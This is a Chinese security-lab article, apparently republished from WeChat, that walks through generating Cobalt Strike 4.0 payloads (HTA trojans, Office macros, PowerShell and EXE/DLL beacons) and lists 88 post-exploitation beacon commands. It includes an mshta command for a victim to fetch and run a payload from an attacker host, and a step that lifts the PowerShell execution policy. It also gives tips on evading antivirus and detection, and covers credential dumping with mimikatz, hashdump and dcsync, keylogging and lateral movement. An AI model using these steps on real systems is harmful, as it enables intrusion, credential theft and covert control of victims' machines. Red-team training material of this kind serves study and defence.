> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MB4WsKCQSEWqoiXlzVUfHg)

****出品｜MS08067 实验室（www.ms08067.com）****

> 本文作者：**BlackCat**（Ms08067 内网安全小组成员）

BlackCat 微信（欢迎骚扰交流）：

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5axwAskE0hw31ju4wfmTGXvEPfPrDWkMDBT7hDUY52pwY000rRwz3rQ/640?wx_fmt=jpeg)  

步骤：Attacks—〉Packages—〉如下:

**HTML Application  生成恶意的 HTA 木马文件**

**MS Office Macro  生成 office 宏病毒文件**

**Payload Gene rator  生成各种语言版本的 payload;**

**Windows Executable  生成可执行 exe 木马；**

**Windows Executable⑸  生成无状态的可执行 exe 木马。**

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt59WwfZR3ib3DBaDyaxx0I8ZYddoseVG01ZccOLNluibK3jfyAxkurwVHg/640?wx_fmt=jpeg)

  

  

**1、HTML Application**

**生成恶意的 HTA 木马文件**

—个 HTML Application （HTML 应用）是一个使用 HTML 和一个 Internet 浏览器支持的脚本语言编写的 Windows 程序。该程序包生成一个 HTML 应用，该应用运行一个 CobaltSt rikepayload。你可以选择可执行的选项来获取一个 HTML 应用，此 HTML 应用使得一个可执行文件落地在磁盘上并运行它。

选择 PowerShell 选项来得到一个 HTML 应用，该应用使用 PowerShell 来运行一个 payload。使用 VBA 选项来静默派生一个 MicrosoftExcel 实例并运行一个恶意的宏来将 payload 注入到内存中。

生成一个 HTML application

Attacks -> Packages -> Html Application

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5fAEI8upib9LWNb4hyeONV6FnV6l1Z0MKHvgVrguLFTF3AG6uTibjZNUQ/640?wx_fmt=jpeg)

  

  

这里有三种工作方式

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5m2ewqADVfyQQibwu1yiaETxGuKHUMLUbJUJP0uXG9644ibvc0ruoNndTA/640?wx_fmt=jpeg)

  

  

executable（生成可执行攻击脚本）

powershell（生成一个 powershell 的脚本）

VBA（生成一个 vba 的脚本，使用 mshta 命令执行）

这里借鉴一个网上的方法，生成一个 powershell, 因为 i 两外两种方式上线不成功，然后配合 host file 使用。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5Jt22BrBYgibxxsYFwX23A1Q48aPVbSic9dnmS3s9W8SLX10rceVytvZg/640?wx_fmt=jpeg)

  

  

然后会生成一个 URL 复制到

http://x.x.x.x:8008/download/file.ext

然后在受害者机器上运行

mshta http://x.x.x.x:8008/download/file.ext

然后 CS 端就可以收到上线了

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5WaCutnOHAUL3TLW5OOJk63szxjWSIUWdKmXqjHvDTAsficGK8vuibA7Q/640?wx_fmt=jpeg)

  

  

**2、MS Office Macro**

该程序包生成一个 MicrosoftOffice 的宏文件并提供将宏嵌入 Microsoft Word 或 Microsoft Excel 的说明。这个参考我钓鱼部分的宏文件制作部分的文章。

**3、payload Generator**

该程序包允许你以不同的多种格式导出 Cobalt Strike 的 stager。

运行 Attacks -> packages --> payload generator

该模块可以生成 n 种语言的后门 Payload, 包括 C,C#,Python,Java,Perl,Powershell 脚本，Powershell 命 令，Ruby,Raw, 免杀框架 Veli 中的 shellcode 等等…

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5tpibqqVwGzNpatPX19zpVr2ibtoSlRDkzkPo21ibW8Zum5Rib74t5ZXEog/640?wx_fmt=jpeg)

  

  

渗透 Windows 主机过程中，用的比较多的就是 Powershell 和 Powershell Command, 主要是因为其方便 易用，且可以逃避一下杀毒软件（AV）的查杀。

以 Powe rshell Command 为例，生成的 payload 为一串命令，只要在主机上执行这一串命令（主机需安 装 Powe rshell）, cs 即可收到主机的 beacon

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5opTdvNLyibruIZYqnhGGlibdOBr21icibECicyvOb2ofwZmIfsmcmRh7r6Q/640?wx_fmt=jpeg)

  

  

**4、Windows Executable (Windows 可执行文件)**

该程序包生成一个 Windows 可执行 Ar tifact，用于传送一个 payload stage r。这个程序包为你提供了多种输出选项。

Windows Serv ice EXE 是一个 Windows 可执行文件，可响应 Service Cont rol Manage r 命令。你可以使用这个可执行文件来作为使用 sc 命令起的 Windows 服务的调用程序，或使用 Metasploit 框架的 PsExec 模块生成一个自定义的可执行文件。

也就是说，普通的 EXE 和服务器启动调用的 EXE 是有区别是。利用 Windows ServiceEXE 生成的 EXE 才能用来作为服务自启动的 EXE, 利用 Cobalt Strike 中 Windows exe 生成的 EXE 不能作为服 务自启动的 EXE 程序 (因为不能响应 Service Control Manager)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5SMH7MEDIF7d8mDxaFwbicaDrnMcQInicoYxWuOxqKVvUBF2zP3uaibblA/640?wx_fmt=jpeg)

  

  

Windows DLL (32-bit) 是一个 x86 的 Windows DLL。

Windows DLL (64-bit) 是一个 x64 的 Windows DLL。这个 DLL 会派生一个 32 位的进程，并且将你的监听器迁移至其上。这两个 DLL 选项都会导出一个开始功能，此功能与 rundll32 .exe 相兼容。使用 rundll32 .exe 来从命令行加载你的 DLL。勾选 Use x64 payload 框来生成匹配 x64 stager 的 x64Ar tifact。勾选 Sign executable file 框来使用一个代码签名的证书来签名一个 EXE 或 DLL Ar tifact。你 必须指定一个证书，你必须在 C2 拓展文件中指定证书。

上面说了好多但是实践非常简单，只是需要确认下受害者的电脑是 X64 还是 X32 直接运行我们生成的 exe 文件

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5QGWhhlYPNbupEpXrhs4GrNJgXKIUGmmYdDnvgXqtUYFNu1SvS1nHlA/640?wx_fmt=jpeg)

  

  

**5、Windows Executable(s)**

该程序包直接导出 Beacon (也就是 payload stage)，这个 Beacon 是作者写好的 32 或 64 位 DLL，是一个不使用 stager 的可执行文件，直接和监听器连接、传输数据和命令。一个不使用 stager 的 payload Ar tifact 被称为无阶段的 Ar tifact。这个程序包也有 Powe rShell 选项来导出 Beacon 作为一个 PowerShell 脚本，或 raw 选项导出与位置无关的 beacon 代码。

默认情况下，这个对话导出 x86 payload stage。勾选 Use x64 payload 框来使用 x64 Ar tifact 生成一个 x64 stage。勾选 Sign executable file 框来使用代码签名的证书来签名一个 EXE 或 DLL Artifact。

这里尝试生成一个 powershell 马

但是生成后直接运行不可行

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5kmSnntnzSmf678sFWWdh4hUkhRlmRibzISKkyEtWBickMbbicVukmViapw/640?wx_fmt=jpeg)

  

  

这里要更改下他的策略

只有管理员才有权限更改这个策略。非管理员会报错。查看脚本执行策略，可以通过：

PS E:> Get-ExecutionPolicy

更改脚本执行策略，可以通过

PS E:> Get-ExecutionPolicyRestrictedPS E:> Set-ExecutionPolicy UnRestricted

然后再次执行：

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5FTaGmC9VulVhZsCMmwkLJkF1QUzSTiaUlRLO22Zz1fXZed57zAEnmAQ/640?wx_fmt=jpeg)

  

  

****CS4.0 上线机器后操作****

右键菜单:

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5cKSBRo0zIeNAoiaQicVlkRPa2sGpHlOpStGECT8fQHwYzROtEEWJfblA/640?wx_fmt=jpeg)

  

  

**一、Interact**

进入操作命令

**二、Access**

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5Uibf3NrPVWbtCIpo7knTvQaNqiatIKQ6PKMQTfhYc35L7SGu8GLLG5eA/640?wx_fmt=jpeg)

  

  

Dump Hashes # 获取 hash

Elevate #提权

Golden Ticket #生成黄金票据注入当前会话

Make token #凭证转换

Run Mimikatz # 运行 Mimikatz

Spawn As #用其他用户生成 Cobalt Strike 侦听器

**三、Explore**

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5uPDDNWa00ibo3CPNOkXbm1Vxn14holApDv0sCBAjoaBibj8Jl99nqLXw/640?wx_fmt=jpeg)

  

  

Browser Pivot #劫持目标浏览器进程

Desktop(VNC) #桌面交互

File Browser #文件浏览器

Net View #命令 Net View

Port Scan #端口扫描

Process List #进程列表

Screenshot # 截图

**四、Pivoting**

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5OYMGYibs65AvSC1FDc5PbkKspPpciaeVsPsmNKibErr4KuL3U30dAUBsQ/640?wx_fmt=jpeg)

  

  

SOCKS Server# 代理服务

Listener #反向端口转发

Deploy VPN #部署 VPN

**五、Spawn**

外部监听器（如指派给 MSF, 获取 meterpreter 权限）

**六、Session**

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5uCrcgNDju8nLdOOUTuG1YcVdPlcG0bamcGKbaMxDjGmevh7eRlozpw/640?wx_fmt=jpeg)

  

  

Note #备注

color #标注颜色

Remove #删除

Sleep #指定被控端休眠时间，默认 60 秒一次回传，让被控端每 10 秒来下载一次任务。实际中频率 不宜过快，容易被发现。(心跳时间)

Exit #退出

**interact 打开 beacon 后执行的操作:**

1. argue 进程参数欺骗

2. blockdlls 阻⽌⼦进程加载⾮ Microsoft DLL

3. browserpivot 注⼊受害者浏览器进程

4. bypassuac 绕过 UAC 提升权限

5. cancel 取消正在进⾏的下载

6. cd 切换⽬录

7. checkin 强制让被控端回连⼀次

8. clear 清除 beacon 内部的任务队列

9. connect Connect to a Beacon peer over TCP

10. covertvpn 部署 Covert VPN 客户端

11. cp 复制⽂件

12. dcsync 从 DC 中提取密码哈希

13. desktop 远程桌⾯ (VNC)

14. dllinject 反射 DLL 注⼊进程

15. dllload 使⽤ LoadLibrary 将 DLL 加载到进程中

16. download 下载⽂件

17. downloads 列出正在进⾏的⽂件下载

18. drives 列出⽬标盘符

19. elevate 使⽤ exp

20. execute 在⽬标上执⾏程序 (⽆输出

21. execute-assembly 在⽬标上内存中执⾏本地. NET 程序

22. exit 终⽌ beacon 会话

23. getprivs Enable system privileges on current token

24. getsystem 尝试获取 SYSTEM 权限

25. getuid 获取⽤户 ID

26. hashdump 转储密码哈希值

27. help 帮助

28. inject 在注⼊进程⽣成会话

29. jobkill 结束⼀个后台任务

30. jobs 列出后台任务

31. kerberos_ccache_use 从 ccache ⽂件中导⼊票据应⽤于此会话

32. kerberos_ticket_purge 清除当前会话的票据

33. kerberos_ticket_use Apply 从 ticket ⽂件中导⼊票据应⽤于此会话

34. keylogger 键盘记录

35. kill 结束进程

36. link Connect to a Beacon peer over a named pipe

37. logonpasswords 使⽤ mimikatz 转储凭据和哈希值

38. ls 列出⽂件

39. make_token 创建令牌以传递凭据

40. mimikatz 运⾏ mimikatz

41. mkdir 创建⼀个⽬录

42. mode dns 使⽤ DNS A 作为通信通道 (仅限 DNS beacon)

43. mode dns-txt 使⽤ DNS TXT 作为通信通道 (仅限 D beacon)

44. mode dns6 使⽤ DNS AAAA 作为通信通道 (仅限 DNS beacon)

45. mode http 使⽤ HTTP 作为通信通道

46. mv 移动⽂件

47. net net 命令

48. note 备注

49. portscan 进⾏端⼝扫描

50. powerpick 通过 Unmanaged PowerShell 执⾏命令

51. powershell 通过 powershell.exe 执⾏命令

52. powershell-import 导⼊ powershell 脚本

53. ppid Set parent PID for spawned post-ex jobs

54. ps 显示进程列表

55. psexec Use a service to spawn a session on a host

56. psexec_psh Use PowerShell to spawn a session on a host

57. psinject 在特定进程中执⾏ PowerShell 命令

58. pth 使⽤ Mimikatz 进⾏传递哈希

59. pwd 当前⽬录位置

60. reg Query the registry

61. rev2self 恢复原始令牌

62. rm 删除⽂件或⽂件夹

63. rportfwd 端⼝转发

64. run 在⽬标上执⾏程序 (返回输出)

65. runas 以其他⽤户权限执⾏程序

66. runasadmin 在⾼权限下执⾏程序

67. runu Execute a program under another PID

68. screenshot 屏幕截图

69. setenv 设置环境变量

70. shell 执⾏ cmd 命令

71. shinject 将 shellcode 注⼊进程

72. shspawn 启动⼀个进程并将 shellcode 注⼊其中

73. sleep 设置睡眠延迟时间

74. socks 启动 SOCKS4 代理

75. socks stop 停⽌ SOCKS

76. spawn Spawn a session

77. spawnas Spawn a session as another user

78. spawnto Set executable to spawn processes into

79. spawnu Spawn a session under another PID

80. ssh 使⽤ ssh 连接远程主机

81. ssh-key 使⽤密钥连接远程主机

82. steal_token 从进程中窃取令牌

83. timestomp 将⼀个⽂件的时间戳应⽤到另⼀个⽂件

84. unlink Disconnect from parent Beacon

85. upload 上传⽂件

86. wdigest 使⽤ mimikatz 转储明⽂凭据

87. winrm 使⽤ WinRM 横向渗透

88. wmi 使⽤ WMI 横向渗透

**扫描下方二维码加入星球学习**

**加入后会邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**目前 35000 + 人已关注加入我们  
**![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)